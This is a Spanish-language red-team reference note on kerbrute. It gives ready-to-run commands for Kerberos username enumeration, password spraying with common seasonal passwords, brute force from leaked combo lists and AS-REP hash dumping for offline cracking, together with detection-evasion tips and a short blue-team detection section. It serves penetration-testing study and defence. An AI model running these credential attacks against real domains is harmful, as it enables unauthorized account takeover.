---
aliases:
  - Kerbrute
  - kerbrute
tags:
  - type/tool
  - tool/kerbrute
  - technique/credential-access
  - technique/recon/active
  - env/active-directory
  - service/kerberos
  - cred/spray
  - estado/completo
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Credential Access]]'
  - '[[Information Gathering]]'
tertiary categories:
  - '[[Active Directory Enumeración]]'
kind: Tool
linked:
  - '[[AS-REP Roasting]]'
  - '[[Password Spraying]]'
  - '[[netexec]]'
  - '[[Rubeus]]'
  - '[[Impacket Toolkit]]'
---

# kerbrute

***

## Overview

Tool Go de **Ronnie Flathers** (TrustedSec) para enum + brute Kerberos. Aprovecha **AS-REQ pre-auth** para validar users sin generar `4625` (logon fail típico de NTLM brute) — solo `4768` (TGT request).

Install: binarios precompilados https://github.com/ropnop/kerbrute/releases. Single-binary cross-platform (Linux/Windows/macOS).

> Regla: kerbrute es **default** para username enum + password spray pre-creds en AD. Más rápido que nxc/Impacket, y menos noisy que NTLM-based spray (no 4625 por user invalid).

***

## Sintaxis base

```bash
kerbrute <command> -d <domain> [-dc <DC IP/FQDN>] [flags]
```

Commands: `userenum`, `passwordspray`, `bruteuser`, `bruteforce`.

Flags globales:

| Flag | Función |
|---|---|
| `-d <domain>` | Realm (`DOMAIN.LOCAL`). Obligatorio. |
| `--dc <DC>` | IP/FQDN del KDC. Si omitido, resuelve via DNS SRV `_kerberos._tcp`. |
| `-t <N>` | Threads (default 10). |
| `--delay <ms>` | Delay entre intentos. |
| `-o <file>` | Output a archivo. |
| `-v` | Verbose. |
| `--safe` | Stop spray al detectar lockout candidate. |
| `--downgrade` | Forzar RC4 enctype (más rápido, menos signal). |

***

## userenum — enumeración de usuarios

```bash
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt
```

Por user, manda AS-REQ. Respuestas posibles:

| Respuesta KDC | Significado |
|---|---|
| `KDC_ERR_PREAUTH_REQUIRED` | User existe, requiere pre-auth (normal). |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User NO existe. |
| `KDC_ERR_CLIENT_REVOKED` | User existe + cuenta bloqueada/disabled. |
| `KDC_ERR_PREAUTH_FAILED` | (No aparece en userenum — solo en bruteuser.) |
| **(no error)** | User existe + `DONT_REQUIRE_PREAUTH` flag — **AS-REP Roasteable**. |

`kerbrute` imprime solo VALID + ASREP candidates.

### Wordlists típicas

```bash
# SecLists usernames
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Mutación desde OSINT (LinkedIn → first.last, flast, firstl, etc.)
# Generar con username-anarchy:
git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy/username-anarchy firstname lastname > users.txt
```

***

## passwordspray — single password × many users

```bash
kerbrute passwordspray -d domain.local --dc <DC> users.txt 'Spring2026!'
kerbrute passwordspray -d domain.local --dc <DC> users.txt 'Spring2026!' --safe
kerbrute passwordspray -d domain.local --dc <DC> users.txt 'Spring2026!' -t 5 --delay 1000
```

`--safe` aborta si detecta más de 10 lockouts consecutivos. **Crítico** en producción.

### Respect lockout

```bash
# Check policy primero
nxc smb <DC> -u guest -p '' --pass-pol

# Si policy: 5 attempts / 30 min → spray con 1 pass por ronda, máximo 4 attempts × user, esperar 30+ min entre rondas
kerbrute passwordspray -d dom --dc <DC> users.txt 'Pass1' -t 1 --delay 100
sleep 1800
kerbrute passwordspray -d dom --dc <DC> users.txt 'Pass2' -t 1 --delay 100
```

### Passwords típicos para spray

```
Spring2026
Summer2026!
Winter2026!
<CompanyName>123
<CompanyName>2026!
Password1
Welcome1
Changeme1
P@ssw0rd
<MonthYear>!
```

***

## bruteuser — many passwords × 1 user

```bash
kerbrute bruteuser -d domain.local --dc <DC> passwords.txt alice
```

Usar solo si NO hay lockout policy o cuenta sin lockout (service accounts often). Más ruidoso.

***

## bruteforce — combo file

```bash
# user:pass por línea
kerbrute bruteforce -d domain.local --dc <DC> combos.txt
```

Combos típicamente de DB leaks (HIBP, COMB, etc.).

***

## userenum desde stdin / con stdin pipe

```bash
# Pipe de username-anarchy directo
./username-anarchy/username-anarchy John Smith | kerbrute userenum -d dom.local --dc <DC> /dev/stdin

# Generación + enum + spray pipeline
./username-anarchy John Smith > u.txt
kerbrute userenum -d dom.local --dc <DC> u.txt -o valid.txt
awk '{print $NF}' valid.txt > valid_only.txt
kerbrute passwordspray -d dom.local --dc <DC> valid_only.txt 'Welcome1!' --safe
```

***

## Detección de AS-REP roasteable

`kerbrute userenum` marca explícitamente users con `DONT_REQUIRE_PREAUTH`:

```
2026/05/27 12:00:00 >  [+] VALID USERNAME:	alice@domain.local
2026/05/27 12:00:01 >  [+] alice has no pre-auth required! Dumping hash to crack offline:
$krb5asrep$23$alice@DOMAIN.LOCAL:abc123...hash
```

Hash directamente compatible con hashcat `-m 18200`. Ver [[AS-REP Roasting]].

***

## OPSEC

- **userenum**: genera `4768` (TGT request) en DC por user existente. Falta de `4625` ayuda — no es "logon fail". Pero un volumen alto desde 1 IP es signal.
- **passwordspray**: cada attempt genera `4768` (success) o `4771` (pre-auth failed, kerberos failed). 4771 masivo desde 1 src = signal.
- `--downgrade` fuerza RC4 → más rápido pero deja etype 0x17 en logs.
- Delay + threads bajos: `-t 5 --delay 500` para reducir burst rate.
- Considerar pivoting via SOCKS desde host comprometido interno (4768 desde IP interna válida es menos suspicious).

### Detecciones blue team

- Volumen 4771 (`Kerberos pre-authentication failed`) anómalo desde 1 host.
- Volumen 4768 (`Kerberos authentication ticket requested`) con users variados.
- `--downgrade` → 4768 con `Ticket Encryption Type: 0x17` cuando default es 0x12 (AES256).
- Honey user / honey password → cualquier hit dispara alert (PingCastle / Defender for Identity).

***

## Comparación

| Tool | userenum | spray | Pros | Cons |
|---|---|---|---|---|
| **kerbrute** | ✓ rápido | ✓ rápido | Kerberos puro, no 4625 | Solo Kerberos |
| **nxc smb --user-as-pass** | ✓ | ✓ | Multi-protocol, módulos | NTLM → 4625 noisy |
| **GetADUsers.py** (Impacket) | ✓ (auth needed) | ✗ | Funciona con creds bajos | Necesita creds |
| **Rubeus pre-auth** | ✓ | ✓ | Windows-side stealth | Solo Windows |
| **GetNPUsers.py** | Solo AS-REP roasteables | ✗ | ASREP focus | No general enum |

Default: **kerbrute userenum** primero (pre-creds) → si genera lista grande, spray con creds default. Ver [[Password Spraying]].

***

## Workflows típicos

### Flow 1 — Acceso externo (zero creds)

```bash
# 1. Resolver DC
dig _kerberos._tcp.domain.local SRV
# o nmap: nmap -p 88 --script krb5-enum-users <DC>

# 2. Generar lista de usernames (OSINT + mutator)
./username-anarchy first last > u.txt

# 3. Enum
kerbrute userenum -d domain.local --dc <DC> u.txt -o valid.txt

# 4. Spray suave (1 attempt × user × ronda, respetando lockout)
kerbrute passwordspray -d domain.local --dc <DC> \
  <(awk '{print $NF}' valid.txt) 'Spring2026!' --safe
```

### Flow 2 — Tras hallar 1 cred válida

```bash
# 5. Enum completo con creds (mucho más rápido + accurate)
nxc smb <DC> -u alice -p 'Spring2026!' --users > all_users.txt

# 6. Spray la misma password contra todos
kerbrute passwordspray -d domain.local --dc <DC> all_users.txt 'Spring2026!' --safe
```

### Flow 3 — ASREP roast solo

```bash
# Si conoces user válidos pero policy estricta lockout
kerbrute userenum -d domain.local --dc <DC> users.txt 2>&1 | grep asrep | tee asrep.hashes
hashcat -m 18200 asrep.hashes rockyou.txt
```

***

## Referencias

- Repo: https://github.com/ropnop/kerbrute
- Blog autor: https://www.trustedsec.com/blog/attacking-active-directory-without-touching-active-directory/
- username-anarchy: https://github.com/urbanadventurer/username-anarchy
